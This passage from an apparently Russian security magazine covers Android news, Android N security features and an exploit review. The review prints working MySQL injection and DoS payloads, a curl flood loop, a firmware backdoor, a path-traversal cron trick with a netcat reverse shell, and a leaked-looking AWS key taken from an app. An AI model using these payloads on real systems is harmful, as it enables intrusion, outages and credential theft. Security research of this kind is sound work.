диомодули, сенсоры и батарея больше не заменяемые. Все, что теперь можно
сделать, — это поставить более крутую камеру или динамик, кнопку для бы-
строго запуска софта или, например, E Ink дисплей, отображающий время
и погоду. Лучше, чем ничего, однако не совсем понятно, чем подход Google
отличается от концепции сменных модулей LG G5 или тех же смартфонов
Motorola с расширяемым железом.
   Посмотреть, как выглядит смартфон в своем текущем виде, можно на этом
видео. В ролике, кстати, очень хорошо заметно, что Google делает акцент
не на апгрейде, а на подстройке смартфона к различным ситуациям. Поехал
с друзьями в Париж — вставляй в смартфон хорошую камеру, пошел на про-
бежку — вставляй фитнес-трекер, нужен хороший звук — у тебя всегда есть
несколько съемных динамиков (хороший звук из динамиков размером с моне-
ту, да...).





                                                    Недомодульный смартфон

Еще одна забавная новость: приложения Android вскоре можно будет запу-
скать в Chrome OS. Еще один этап на пути сближения Android с Chrome OS:
приложения Android в Chrome OS, полноценный оконный интерфейс в Android.
Выводы делать не будем, скажем лишь, что стек запуска Android-приложений
ARC, который ранее планировалось использовать для этой цели, теперь заме-
нен на полноценную версию Android, работающую в выделенном контейнере.
   Одной строкой:
•  Компания Google выиграла суд у Oracle, касающийся использования Java
   API в Android. К слову сказать, суд длится уже шестой год и мяч постоянно
   переходит из рук в руки, так что вердикт далеко не окончательный.
•  Российская компания «Открытая мобильная платформа» получила лицен-
   зию на разработку локализованного варианта мобильной операционной
   системы Sailfish. Она и будет нашей национальной мобильной ОС с бэкдо-
   рами и зондами. Об этой операционке мы, кстати, уже писали.
• В связи с провалом инициативы Android Update Alliance, призванной объе-
   динить производителей, вовремя выпускающих обновления, Google решила
   просто посрамить тех, кто этого не делает. Поговаривают, будет опублико-
   ван список плохишей.
•  Google портирует Android на Raspberry Pi. Зачем это нужно, не совсем по-
   нятно, но, скорее всего, своих поклонников данная связка найдет.

УСТРОЙСТВА
В мае на рынке появилось множество отличных устройств, включая очень
тепло встреченный HTC 10, который назвали реваншем компании и ее если
не спасением, то благородной смертью. Однако все эти новые модели уже
давно обсосаны на огромном количестве отечественных и зарубежных ресур-
сов. Мы поговорим совсем о другом.
  В самом конце месяца на Mashable появилась информация о смартфоне,
стоимостью 14... тысяч долларов. Это смартфон Solarin на базе Snapdragon
810, с 5,5-дюймовым экраном, камерой на 12,8 Мп, 4 Гбайт оперативной
и 128 Гбайт постоянной памяти. Остальные 13 тысяч приходятся на «техноло-
гии шифрования, используемые военными» и (внимание) хардварную кнопку,
включающую повышенный уровень безопасности. Такая вот ловкая развод-
ка доверчивых бизнесменов. Кстати, рекомендую убавить громкость, сходить
на их сайт и посмотреть на их разрывающую мозг мегабрутальную анимацию.





                                                                     14 000 долларов

Почти в то же время китайский стартап Moxi Group представил смарт-
фон-браслет с гибким графеновым дисплеем. Серьезно, смартфон можно
свернуть и надеть на руку без потери функциональности. Причем уже имеет-
ся прототип, который можно вживую увидеть на сайте CNN. Пока что он чер-
но-белый, но к 2018 году компания обещает создать и цветную модель. Цена
новинки — 760 долларов.





                                               Концепт цветной версии браслета

Опять же в конце месяца знаменитая Pebble представила сразу три устрой-
ства: Pebble 2, Pebble Time 2 и Pebble Core. И если с первыми двумя все ясно:
дальше, выше, сильнее, то Pebble Core действительно занятный девайс. Это
очень компактный мини-ПК в форме квадратного брелока для часов, глав-
ная задача которого — выполнять функции фитнес-трекера. Девайс имеет
встроенный GPS, 3G-модуль и Jack для подключения наушников. Взял с собой
на пробежку, включил любимую музыку — Core записал твой маршрут и другие
данные и автоматически передал в Runkeeper. Но! Pebble Core можно хакать!
Здесь есть SDK, порт для подключения к компу и две программируемые кноп-
ки. Представь, что можно сделать с этим девайсом, учитывая, что его можно
носить как брелок на связке ключей.





                                                                         Pebble Core

ИНСТРУМЕНТЫ
•  Android Tamer 4 — значительное обновление Linux-дистрибутива с набо-
   ром инструментов для анализа, пентестинга и реверса приложений Android.
   Любой, кто занимается хоть одним видом подобной деятельности, должен
   обязательно иметь данную систему установленной в VirtualBox и изучить
   каждый представленный инструмент. В новой версии: переход на Debian 8,
   собственный репозиторий пакетов для установки дополнительных инстру-
   ментов, новые врапперы для удобного запуска утилит.
•  Android Studio 2.2 — обновление среды разработки Android, главная фиш-
   ка которого — существенно переработанный редактор разметки: теперь он
   стал быстрым и по-настоящему интеллектуальным.
•  Fridump — инструмент для дампа оперативной памяти Android и iOS на ос-
   нове инъектора Frida. Плюс рассказ о том, как сделать дамп в домашних
   условиях.
•  Plasma — интерактивный дизассемблер для x86/ARM/MIPS, генерирующий
   удобный для чтения псевдокод с отступами и подсветкой синтаксиса. Прак-
   тически идеально для тех, кому нужен простой бесплатный инструмент вме-
   сто перегруженной функциональностью IDA Pro.





                                                                       Android Tamer

ПОЧИТАТЬ
How to lock the samsung download mode using an undocumented feature of aboot —
большая статья, посвященная залочке загрузчика Galaxy S5. По словам автора,
данная процедура очень полезна в странах, где смартфоны Samsung прода-
ются разлоченными, что открывает серьезную дыру в безопасности. Что каса-
ется самой статьи, то это очень интересный ресерч, из которого можно узнать
очень многое о том, как работает система загрузки Android, от первичного boot
flow до устройства recovery. Рекомендуем к прочтению всем, кто интересуется
данным вопросом.

Adaptive Android Kernel Live Patching (pdf) — интересный концепт по устране-
нию уязвимостей Android от ребят из Baidu. Вкратце: они предлагают создать
систему динамического патчинга ядра Linux с целью устранения уязвимостей,
которая не зависела бы от версии прошитого в устройства ядра и наличия ис-
ходных текстов. В целом идея — взломать ядро с помощью имеющейся в нем
уязвимости и запустить shellcode, который бы модифицировал структуры ядра,
исправляя ту же уязвимость. Проблема только в том, что у них нет готового ре-
шения.

Также документ интересен довольно глубоким ресерчем, посвященным те-
кущему состоянию рынка смартфонов с точки зрения безопасности. Выводы
у них очевидные: 60% устройств уязвимы. Но интересно и то, что они приводят
сравнение с iOS: оказывается, в ней было найдено примерно такое же количе-
ство уязвимостей, но, так как Apple полностью контролирует свои смартфоны,
она может вовремя обновлять iOS и залатывать дыры.





                                           Упрощенная процедура патчинга ядра


Droid-FF — the Android fuzzing framework (pdf) — презентация security-инженера
Intel, посвященная написанному им же инструменту Droid-FF для фаззинга при-
ложений Android и системы в целом. Интересен здесь не столько сам инстру-
мент, сколько описание поиска багов на примере знаменитого бага Stagefright.

Небольшой, но наглядный справочник security-фич Android, оформленный
в виде файлов документации на GitHub. Здесь и про доверенную загрузку,
и про сканер отпечатков пальцев, и про sertificate pinning, и много про что еще.
В целом довольно кратко, но сразу обо всем. Плюс автор обещал развивать
проект.





   На закуску: твит человека, нашедшего бэкдор в открытом исходном тексте ядра Allwinner
  MOBILE: Колонка Евгения Зобнина
   ANDROID N
   И БОРЬБА
ЗА БЕЗОПАСНОСТЬ





                        Евгений Зобнин
                                                         zobnin@gmail.com


  Одним из самых интересных на Google I/O было выступле-
  ние Адриана Людвига, отвечающего за безопасность плат-
  формы Android. За сорок минут он успел рассказать и о нов-
  шествах Android M в плане безопасности, и о грядущем
  Android N. Так как о security-фичах шестой версии системы
  мы уже писали, я остановлюсь лишь на том, что инженеры
  Гугла успели добавить в седьмую (или 6.1, которой, по слу-
  хам, может стать новая версия Android). Поехали.





  ХАРДВАРНОЕ ХРАНИЛИЩЕ КЛЮЧЕЙ
      Итак, первое, о чем Адриан рассказал, — это хардварное хранилище клю-
   чей. Речь идет о выделенном микрокомпьютере внутри мобильного чипа, ко-
  торый отвечает исключительно за шифрование данных и хранение ключей
  шифрования и доступен лишь малой части операционной системы.
     Данная технология используется в iPhone (Secure Enclave) и реализована
   в Android начиная с версии 4.3. Однако до более-менее пригодного к исполь-
  зованию состояния она была доведена лишь к версии 6.0, когда появились
  все необходимые функции для генерации ключей, разграничения доступа к
   ним, поддержка ключей RSA, ECDSA, AES, HMAC и прочее.
      Так вот, начиная с Android N Google будет требовать обязательное вклю-
  чение поддержки хардварного хранилища ключей в устройства. То есть то,
   что Apple сделала четыре года назад, в Android появилось только сейчас. Это
  совсем не удивительно, учитывая зоопарк устройств на базе Android, сре-
  ди которых далеко не только смартфоны и планшеты. Удивительно другое —
   TrustZone, самая распространенная реализация данной технологии, разра-
  ботанная ARM, дырявая как сапог.





                                                   Один из слайдов презентации


   Точнее, дырявая не сама технология, а ее реализация в чипах Qualcomm, ко-
  торые чаще всего используются в смартфонах и планшетах. Обход защиты
   этой технологии уже давным-давно описан в блоге «Bits, Please!», а совсем
  недавно появилась информация об извлечении мастер-ключа TrustZone, того
   самого, с помощью которого можно расшифровать все «защищенное» хра-
  нилище.
     Возможно, новые девайсы на базе Qualcomm и получат исправленную
  версию чипа, но доверия технология уже не вызывает.

  СКАНЕР ОТПЕЧАТКОВ ПАЛЬЦЕВ И SMART LOCK
  Идем дальше. На очереди сканер отпечатков пальцев и Smart Lock. Здесь все
  довольно скучно. Раньше защиту экрана блокировки применяли 50% пользо-
   вателей, сканер поднял этот уровень до 90% (очень странные цифры, кстати).
  Ну и Smart Lock, технология, с помощью которой можно привязать смартфон
   к смарт-часам и не вводить пароль, пока они поблизости, позволила вводить
  пароль в два раза реже.





                                                                 Все защищены!

  ШИФРОВАННЫЕ СОЕДИНЕНИЯ С СЕТЬЮ
  Здесь у Адриана две новости. Первая: теперь разработчики могут более тон-
   ко управлять тем, какие компоненты приложения должны использовать за-
  шифрованные соединения, а какие нет. Тут нужна небольшая предыстория.
  В определенный момент разработчики Android осознали, что самим управ-
   лять HTTPS- и прочими TLS-соединениями разработчикам довольно трудно,
  и ввели в AndroidManifest специальную директиву, с помощью которой про-
  граммист мог прямо сказать: «Мое приложение использует только зашифро-
  ванные соединения» (или наоборот), а далее он мог использовать стандарт-
  ные сетевые библиотеки, и система все делала сама.
     Естественно, сразу начались проблемы, потому что часть соединений
  могла быть зашифрована, а часть невозможно было зашифровать в принципе
   (коннекты к провайдерам рекламы, например). Google это исправила, позво-
   лив тонко регулировать, какие именно соединения шифровать, а какие пусть
   идут открытым текстом. Еще одно нововведение: установленные пользовате-
  лем сертификаты теперь не получают уровень доверенных.





                                                            Кусок AndroidManifest.xml

  ШИФРОВАНИЕ ДАННЫХ
  Дальше становится совсем весело: Адриан начинает рассказ об очень стран-
  ной технологии, понять суть которой без бэкграунда затруднительно. А суть
   такова. Начиная с Android M Google стала требовать, чтобы все новые устрой-
   ства на базе этой ОС принудительно включали шифрование данных. В об-
   щем-то, все логично, и к этому все шло еще с пятой версии системы. Но есть
   в этом требовании проблема: если после случайной перезагрузки девайс
   останется заблокирован (и следовательно, зашифрован), как приложения, ко-
   торые, допустим, должны выводить уведомления и выполнять какие-то фоно-
  вые действия, получат доступ к своим данным?
     Инженеры Google придумали гениальное решение — режим Direct Boot.
  Суть такова: каждое приложение теперь может иметь два различных катало-
   га с данными, один доступен до разблокировки устройства, другой — только
   после. При этом разработчик должен сам определять, какой из них использо-
   вать и когда. То есть если какие-то данные нужны приложению всегда, даже
  если смартфон не разблокирован, — будь добр использовать хранилище, до-
  ступное до разблокировки, а остальные данные уже держи в другом.





                                                                                     Direct Boot

  ПРИНУДИТЕЛЬНЫЙ КОНТРОЛЬ ЗАГРУЗКИ
  А это уже о тех вещах, о которых так любят заливать ребята из BlackBerry.
  Речь идет о механизме доверенной загрузки (Verified Boot), поддерживаемом
   Android начиная с версии 4.4 (а не только в вашей прошивке, BlackBerry!). Суть
   в следующем: на каждом этапе загрузки «первичный загрузчик    вторичный
      aboot    ядро Linux    система Android» операционная система умеет
  проверять целостность всех этих компонентов (загрузчики по цифровым под-
   писям, ядро по контрольной сумме, система по контрольной сумме всей ФС).
  Однако если раньше об изменении какого-либо из компонентов система
  лишь предупреждала, то теперь она просто откажется загружаться.
     Более того, теперь в Android есть механизм, позволяющий откатить состо-
  яние системы. То есть ты можешь получить root, перезагрузиться и при следу-
  ющей загрузке получишь нерутованную систему. Как это работает, не совсем
   понятно, но в целом звучит круто.





                                                                                         Verified Boot

  ПРОВЕРКА УСТРОЙСТВ И ОС
  Дальше Адриан перешел к корпоративщине, а если точнее — к технологии,
   которая ей понравится. В Google Play Services теперь есть API под названием
   SafetyNet, который выполняет одну простую задачу: проверяет, оригинальное
  ли устройство (сверка серийников), не была ли его прошивка изменена или
  получен root и в каком состоянии годности она вообще находится.
     Используя данный API, разработчики смогут писать приложения, которые
   в принципе не заработают на модифицированных прошивках или, например,
   в том случае, если версия прошивки или ее patch level не соответствуют опре-
  деленным требованиям. Ранее разработчикам приходилось все это делать
  самим или с помощью специальных библиотек, теперь у них есть готовый
  и простой в использовании инструмент.





                                                      Пример сверки patch level

  ДРУГИЕ УЛУЧШЕНИЯ
  Под конец Адриан рассказал про общее укрепление безопасности:
   •  MediaServer, тот самый сервис, где нашли огромное количество багов
     класса StageFright, теперь разделен на множество независимых сервисов,
     и из них каждый имеет только те полномочия, которые ему нужны. Идея
     здесь в том, что баги были найдены в коде медиакодеков, которые теперь
     не имеют доступа к интернету, так что они не могут быть проэксплуатиро-
     ваны удаленно. Подробнее об этом можно почитать в блоге Google.
   • В дополнение к системе изоляции процессов SELinux теперь используется
     механизм seccomp ядра Linux, предназначенный для запирания приложе-
     ния в песочницу. В основном применяется к системным низкоуровневым
     демонам.
   •  Ужесточен контроль доступа к системной информации, предоставляемой
     с помощью файловых систем /proc и /sys.
   •  Добавлена защита от ransomware. Теперь у пользователя есть возможность
     разблокировать смартфон, заблокированный сторонним приложением.
     Также приложения больше не могут перекрывать системные диалоги.





                                                       Разделенный MediaServer

 ВЫВОДЫ
  Команда Android действительно вкладывает много уси-
  лий в безопасность системы. Если проследить историю
  развития платформы, то становится заметно, насколько
  сильно Android нашпигован самыми разными защитны-
  ми механизмами и подсистемами. Кажется, задейство-                                     WWW
  вано уже все, однако баги есть везде, и Google не может
                                                                               Выступление  обеспечить должную скорость их закрытия, в отличие                                                                           Адриана Людвига
   от Apple, багов в которой найдено не меньше (подробно-
   сти в дайджесте).
Взлом



       WARNING

            Вся информация предоставлена исключительно в ознакомительных целях.
             Лица, использующие данную информацию в противозаконных целях, могут
             быть привлечены к ответственности.
EASY





КАК НАЙТИ ПОТЕНЦИАЛЬНЫЕ УЯЗВИМОСТИИHACKЗАХАРДКОЖЕННЫЕ ДАННЫЕ ANDROID-ПРИЛОЖЕНИЯ





                 isox
                 isox@qiwi.com


Иногда возникает необходимость узнать, какие баги были найдены в ка-
ком-нибудь топовом приложении для Android. Причин для этого может быть
масса: от попыток раскрутить вектор дальше и поиска схожих уязвимостей
до банальных проверок на хардкод. Попробуем провернуть, а поможет нам
в этом связка HackApp + Vulners.
   HackApp — это условно-бесплатный тулкит и сервис для поиска багов
в мобильных приложениях. HackApp ведут свою базу найденных уязвимо-
стей, где подробно описывают векторы атак и уязвимые версии. Vulners —
это бесплатный и открытый движок для поиска уязвимостей в различных
продуктах. Кроме самих багов, Vulners находит и показывает связанные
с уязвимостью сплоиты, патчи и даже новости из открытых источников.
  С помощью Vulners и HackApp можно искать по уязвимостям более чем
22 025 топовых Android-приложений из Google Play! Store. Для поиска нуж-
но указать тип type:hackapp. В результатах поиска отображается тайтл,
количество уязвимостей по степени критичности (красный кружок — кри-
тичные, желтый кружок — средняя критичность, серый кружок — приме-
чание), информация о приложении (иконка, текущая версия, разработчик
и дата релиза).





                                             Поиск уязвимостей по базе HackApp

Ссылка на бюллетень уязвимостей приложения имеет вид https://
vulners.com/hackapp/HACKAPP:RU.SBERBANK_SBBOL.APK. В бюллетене
перечисляются все уязвимости с кратким описанием и указывается, какие
версии приложения считаются уязвимыми. Полное описание уязвимостей
доступно по ссылке на сайте HackApp.





                                                Описание бага на сайте HackApp

Но настоящей киллер-фичей является возможность найти приложения, чьи не-
радивые разработчики захардкодили внутри учетные записи от Amazon AWS.
Простейший запрос https://vulners.com/search?query=type:hackapp%20
AWS%20credentials выдаст целую кучу таких «перлов».





                     Ищем захардкоженные в Android-приложение креды от AWS

Отлично, у нас есть AWS_KEY. Теперь нужен еще AWS_SECRET_KEY. Давай
не будем останавливаться и заглянем в «домик» разработчиков? :)





          На сайте HackApp можно удобно посмотреть добытый AWS_ACCESS_KEY ключ


Уязвимый APK можно удобно скачать прямо с сайта HackApp. Дальше раскры-
ваем всем известным способом:

java -jar apktool_2.1.1.jar d 895ed3de13f747aae061db3da06283cd.apk

Запускаем grep и... вуаля! Кажется, мы что-то и правда нашли:

MacBook-Pro:895ed3de13f747aae061db3da06283cd pwner$ grep -R
    "AKIAI5AWXTYSXJGU55QA" ./
.//smali/com/adobe/air/AdobeAIR.smali: .field private static final
    TEST_ACCESS_KEY:Ljava/lang/String; = "AKIAI5AWXTYSXJGU55QA"
.//smali/com/adobe/air/AdobeAIR.smali: const-string v1,
"AKIAI5AWXTYSXJGU55QA"





                                                  Достали секретный AWS-ключ!


Что тут скажешь: pwned in less than 1 minute!
   Комбинируя эти два инструмента и простой полнотекстовый поиск, мож-
но вытащить еще много постыдных секретов мобильных приложений :).
   Удачи и успешных познаний!
Взлом





                                                                               Борис Рютин,
                                                                                                     ZORSecurity
                                                                                      @dukebarman
                                                                                                dukebarman.pro
     WARNING

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
    Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОИТОВ
   АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ





В сегодняшнем обзоре мы рассмотрим многочисленные уязвимости
  в IP-камере Motorola Focus. Помимо дефолтных и слабых паролей,
  там еще много интересного. К тому же ее прошивка используется
и другими производителями, что открывает новые пути исследования.
Также разберем DoS-уязвимость и хакерское использование функции
                   procedure analyse() в MySQL.

DOS В ФУНКЦИИ PROCEDURE ANALYSE() ИЗ MYSQL

 CVSSv2:     Нет
 Дата релиза: 29 мая 2016 года
 Автор:       @OsandaMalith
 CVE:         2015-4870

Автор эксплоита нашел возможность вызвать DoS в MySQL версий до 5.5.45
включительно. В функции procedure analyse() падение происходит при обра-
ботке подзапроса.
Пример вызова функции:

select * from `table_name`
procedure analyse((select*from(select 1)x),1);

Соответственно, PoC будет таким:

select * from information_schema.tables
procedure analyse((select*from(select 1)x),1);

Проверка:

mysql> select * from information_schema.tables procedure analyse((se-
lect*from(select 1)x),1);
ERROR 2013 (HY000): Lost connection to MySQL server during query
mysql> select 1;
ERROR 2006 (HY000): MySQL server has gone away
No connection. Trying to reconnect...
ERROR 2003 (HY000): Can't connect to MySQL server on 'localhost'
   (10061)
ERROR: Can't connect to the server
mysql>





                                                  Падение приложения MySQL

Другой пример атаки — это запуск полезной нагрузки, которая была сохранена
в файл и подана на вход mysql.exe (он показан на скриншоте ниже).





                                            Перенаправление атаки на mysql.exe

Если после появления сообщения о падении проверить лог вывода Event Viewer,
то ты сможешь увидеть, что приложение mysqld.exe действительно упало.
При этом смещение для указателя на ошибку будет равно 0x000607f4.





                                     Лог вывода Event Viewer после падения mysqld


Если же мы подконнектимся к процессу с помощью IDA, то сможем увидеть, что
падение происходит в структуре TABLE_LIST из-за поля, которое не было выде-
лено.





                                   Представление функции обработки таблиц в IDA

EXPLOIT
В качестве тестового стенда автор использовал Damn Vulnerable Web Application
(DVWA).
   Если атакующий найдет веб-приложение, уязвимое к SQL-инъекции, то он
сможет с легкостью провести DoS-атаку, MySQL-сервер перестанет отвечать
и все используемые базы данных тоже перестанут быть доступными.
  В Windows достаточно простого запроса для вызова падения и, скорее все-
го, понадобится ручная перезагрузка:

http://localhost/dvwa/vulnerabilities/sqli/?id=1' procedure
   analyse((select*from(select 1)x),1)-- -&Submit=Submit#





                      Пример атакующего запроса на тестовое приложение с MySQL

На *nix-системах mysqld автоматически восстанавливается, но если мы пошлем
многочисленные GET-запросы с такой полезной нагрузкой, то база данных все
равно упадет.
  Пример такой атаки с помощью bash-скрипта, который использует cURL
для GET-запросов:

while true;
do curl "http://host/?id=1%27%20procedure%20analyse%28%28select*
   from%28select%201%29x%29,1%29--%20-" > /dev/null 2>&1
done;

Помимо небольшого bash-скрипта, автор написал версию эксплоита на Python:





                           Пример работы эксплоита для DoS-уязвимости в MySQL


Исходный код и оригинальную статью автора ты можешь найти в его блоге. Еще
автор записал небольшое демонстрационное видео.
   Также функция procedure analyse() может помочь при проведении атаки
через SQL-инъекцию. Это позволяет легче определить число колонок. Резуль-
тат выполнения представлен на скриншоте, где количество выводов равняется
количеству колонок.

http://localhost/dvwa/vulnerabilities/sqli/?id=1' procedure
   analyse()-- -&Submit=Submit#





                      Определение количества колонок с помощью procedure analysis

В примерах атаки, где место для инъекции находится после limit, ты мо-
жешь использовать procedure  analyse() вместе с функциями updatexml
и extractvalue в качестве подзапросов.

select username,password from users
order by 1 desc
limit 0,1
procedure analyse(updatexml(1,concat(0x7e,(version())),0),1);





     Пример инъекции после AFTER с использованием updatexml в качестве подзапроса


select username,password from users
order by 1 desc
limit 0,1
procedure analyse(extractvalue(1,concat(0x7e,database())),1);





    Пример инъекции после AFTER с использованием extractvalue в качестве подзапроса


TARGETS
MySQL <= 5.5.45.

SOLUTION
Производитель выпустил исправление.


ВЗЛОМ IP-КАМЕРЫ MOTOROLA FOCUS 73

 CVSSv2:     Нет
 Дата релиза: 2 февраля 2016 года
 Автор:       неизвестен
 CVE:        N/A

IP-камера Motorola Focus 73 содержит в себе немало сюрпризов. Для начала —
она произведена не Motorola. Это наружный вариант камер семейства Blink
и Motorola IP, произведенных фирмой Binatone. В семейство также входят каме-
ры для слежения за детьми. Эти продукты совместимы с сервисом Hubble, кото-
рый построен на Amazon EC2, — он позволяет владельцам управлять камерами
удаленно, а также получать уведомления о движении. Все это делается через
мобильное приложение.
   Приложение Hubble доступно во всех популярных магазинах. Для исследо-
вания была выбрана версия для Android из магазина Google Play. Приложение
связывается с камерами по протоколу STUN.
  В ходе первоначальной настройки приложение попросит подключить каме-
ру к сети через кабель или нажать клавишу pair на самом устройстве. Нажатие
переключит камеру в режим хоста и создаст открытую сеть Wi-Fi. Далее прило-
жение будет искать сети с названиями типа CameraHD-(MAC адрес) и предла-
гать пользователю подключиться к ним.
   После того как будет выбрана откры-
тая точка, приложение отправит запро-
сы на веб-сервер Nuvoton, чтобы про-
сканировать сети с помощью команды
iwlist. Результаты этого сканирования
вернутся в приложение в виде XML-фай-
ла, откуда пользователь может выбрать
нужную сеть. Затем необходимо ввести
свой секретный ключ для выбранной
сети Wi-Fi. Он передается в незашифро-
ванном виде через открытую сеть с ис-
пользованием простой HTTP-аутенти-
фикации. Логин и пароль стандартные:         Пример поиска сетей устройств
                                                   через мобильное приложениеcamera и 000000. Вид самого запроса
также не отличается оригинальностью,
он составлен из SSID, PSK, логина и па-
роля. Еще интересно то, что эта HTTP-авторизация унаследована от других
продуктов и на деле не используется. Найденные веб-страницы подписаны
для MBP2000W (к примеру, /routersetup.html) и, скорее всего, представля-
ют собой «остатки» предыдущего воплощения устройства как камеры для сле-
жения за детьми.
  В публичном доступе прошивки этого устройства нет, но, как нередко быва-
ет, обновление доступно через некий приватный URL. Найти его не составило
особого труда.
   Автор обнаружил, что прошивка является упакованной файловой системой
Linux с названием skyeye, созданной компанией Cvision. Внутри есть разделы
/bin, /etc и /lib, но это не полноценный Linux, а лишь путь, который монти-
руется камерой в /mnt/skyeye. Некоторые основные бинарные файлы, такие
как BusyBox, сюда не включены. Они принадлежат Nuvoton OS, которая не име-
ет механизма обновления и содержит в себе бинарные файлы десятилетней
давности.
   Также внутри были найдены ссылки на скрипты и файлы конфигурации
для других моделей камер, что наводит на мысли об универсальности прошив-
ки. Так что, по всей видимости, описанные дальше уязвимости можно будет
найти и в них.
   Веб-сервер располагается по пути /mnt/skyeye/mlswwwn/. Он использу-
ет скрипты haserl CGI, которые перебрасывают значения из HTTP-формы на-
прямую в шелл (а в нашем случае еще и с правами root) для выполнения таких
функций, как ведение логов или обновление прошивки.

EXPLOIT
Вредоносное обновление прошивки
Два веб-сервера находятся по упомянутому пути /mnt/skyeye/mlswwwn/ и до-
ступны на портах 80 и 8080. Второй сервер — это busybox httpd. Как и нормаль-
ный сервер httpd, он ограничивает доступ к специальным исполняемым файлам
или скриптам (к примеру, из /cgi-bin). А вот веб-сервер Nuvoton (возможно,
основанный на MJPG) на 80-м порту не имеет таких ограничений, поэтому лю-
бой файл, который мы не увидим на порту 8080, мы сможем полностью прочесть
на восьмидесятом, включая бинарные файлы ELF. Один из них — это очень ин-
тересный haserl-скрипт, он называется haserlupgrade.cgi. Автор эксплоита
обнаружил, что он запускает процесс обновления прошивки. Так как прошивка
не зашифрована и не подписана, то мы можем модифицировать ее и добавить
измененный haserl-скрипт, который будет содержать небольшой однострочный
бэкдор:

<% $FORM_run %>

Модифицированная прошивка может быть загружена через http://(IP):8080/
fwupgrade.html. Затем мы сможем выполнять команды от имени root из брау-
зера:

http://(IP):8080/cgi-bin/script.cgi?run=cat /etc/passwd

Обход директорий и инъекция команд
В описанном выше скрипте haserlupgrade также была найдена старая добрая
уязвимость типа «обход директорий». Скрипт получает на вход упакованный об-
раз с прошивкой и перемещает в спроектированное место вне веб-директории.
При этом он даже не проверяет передаваемое имя, так что, к примеру, имена
new_firmware.tgz и ../../../mnt/skyeye/etc/cron/root будут считаться
правильными в обоих случаях. Но при проведении тестов автору не удалось оста-
вить созданный файл в системе — он удалялся после окончания работы скрипта
(видимо, так настроен процесс обновления). Хотя при этом можно переписать
любой другой неудаляемый файл в системе. К примеру, удаление /bin/busybox
сделает из камеры «кирпич».
   После анализа в скрипте было найдено обращение к бинарному файлу
с именем fwupgrade, который автор сразу же загрузил в IDA. Этот исполня-
емый файл использует имя файла прошивки и сохраняет в /mnt/cache/new_
fwupgrade. Когда fwupgrade получает прерывания SIGUSR1, он читает 128 байт
из файла new_fwupgrade, использует их в имени прошивки и затем вызывает
shell-скрипт для обновления ПО. После завершения скрипт удаляет файл.
   Так как считывается 128 байт и проверок нет, можно сделать очень боль-
шое имя файла, чтобы процесс обновления упал. В результате загруженный
файл не будет удален.





                                     Дизассемблерный код функции из fwupgrade

Чтобы превысить 128 байт, автор сделал имя файла с хождением туда и обрат-
но по директориям и с переходом в cron в конце. Оттуда задания считываются
и выполняются каждую минуту.

../../../mnt/skyeye/mlswwwn/../../../mnt/skyeye/mlswwwn/../../../mnt/
skyeye/mlswwwn/../../../mnt/skyeye/mlswwwn/../../../mnt/skyeye/etc/
cron/root

В качестве задания — открытие шелла каждую минуту:

/bin/busybox nc 10.45.3.100 1664 -e /bin/sh





                 Использование уязвимости типа «обход директорий» в Motorola Focus


После получения шелла были вытащены хеши из файла /etc/shadow, а после пе-
ребора с помощью John the ripper обнаружилось, что пароль root — 123456.
Еще был найден пароль от Wi-Fi, сохраненный открытым текстом в /tmp/wpa.
conf, а также заводские настройки сетей Cvision (они используются для настрой-
ки после сброса памяти устройства).
  Помимо этого, на устройстве запущено несколько интересных опенсорс-
ных утилит, которые, если верить сайту Nuvoton, делают разработку более гиб-
кой. Сервис на 80-м порту похож на MJPG, но имеет дополнительные функции
для удаленного управления.





                                               Список процессов в Motorola Focus

Если запустить команду ps, то мы увидим большое количество потоков для ис-
полняемого файла msloader — он является чем-то вроде функционального
центра устройства. И судя по тому, что cron запускает задания каждую минуту,
такое количество потоков вызывает утечку памяти. Разработчики решили про-
блемы довольно бесхитростно: еще одной задачей в cron, которая перезапуска-
ет устройство ранним утром. Как пишет автор, он не хочет приводить это время,
чтобы злоумышленники тоже спали :).
  На этом сюрпризы не кончились. Логи на устройстве содержат много важ-
ной информации, в том числе и ключ AES для удаленного управления сооб-
щениями STUN, а также данные аккаунта FTP, который используется для хра-
нения видео. Сообщения об ошибках подтвердили предположение о том, что
применяется библиотека PJNATH, поэтому при анализе протокола STUN автор
использовал доступные исходники.
   Интересные логи можно скачать через веб-интерфейс, но сначала они
шифруются с использованием исполняемого файла /bin/crypto. Этот файл
использует Linux crypto API с зашитым ключом AES: Cvision123459876. Это
означает, что любой может сдампить логи с устройства, используя скрипт
host:8080/cgi-bin/logdownload.cgi

Смотрим за подсматривающими
Если атакующий сможет получить доступ к устройству, то сможет и переопре-
делить конфигурацию DNS в файле /etc/resolv.conf. Для этого, к примеру,
можно отправить через наш сервер запросы на upload1.hubble.in (сервис
для хранения изображений). Это позволяет получать уведомления о появлении
движения не только в виде JPEG, но и в виде клипов FLV, которые обычно до-
ступны только платным клиентам Hubble. Эти данные отправляются в незашиф-
рованном в виде вместе с запросами POST к /v1/uploads/snap.json или /v1/
uploads/clip.json. Они могут отстукивать, к примеру, на PHP-скрипт, который
будет сохранять данные.





          Пример перехваченных файлов после появления движения на Motorola Focus


Автор записал демонстрационное видео, которое опубликовал в своем блоге,
где ты также можешь ознакомиться с оригинальной статьей и узнать об этих ка-
мерах более подробно.

TARGETS
Motorola Focus 73 Firmware 1.17.26–1.19.14.

SOLUTION
Производитель выпустил исправление (1.19.26).
ВЗЛОМ
VULNERS —
ГУГЛ ДЛЯ ХАКЕРА





 КАК УСТРОЕН
 ЛУЧШИЙ
 ПОИСКОВИК ПО
 УЯЗВИМОСТЯМ
 И КАК ИМ
 ПОЛЬЗОВАТЬСЯ





Часто нужно узнать всю информацию о какой-нибудь
уязвимости: насколько найденная бага критична,
есть ли готовые сплоиты, какие вендоры уже выпу-
стили патчи, каким сканером проверить ее наличие    Александр Леонов                                                                                                       aleonov.com
в системе. Раньше приходилось искать вручную по
десятку источников (CVEDetails, SecurityFocus, Rapid7 DB, Exploit-
DB, базы уязвимостей CVE от MITRE/NIST, вендорские бюллетени)
и анализировать собранные данные. Сегодня эту рутину можно (и
 нужно!) автоматизировать с помощью специализированных сер-
 висов. Один из таких — Vulners, крутейший поисковик по багам. А
главное — бесплатный и с открытым API. Посмотрим, чем он мо-
жет быть нам полезен.


ЧТО ЭТО ТАКОЕ
 Vulners — это очень большая и непрерывно обновляемая база данных ИБ-кон-
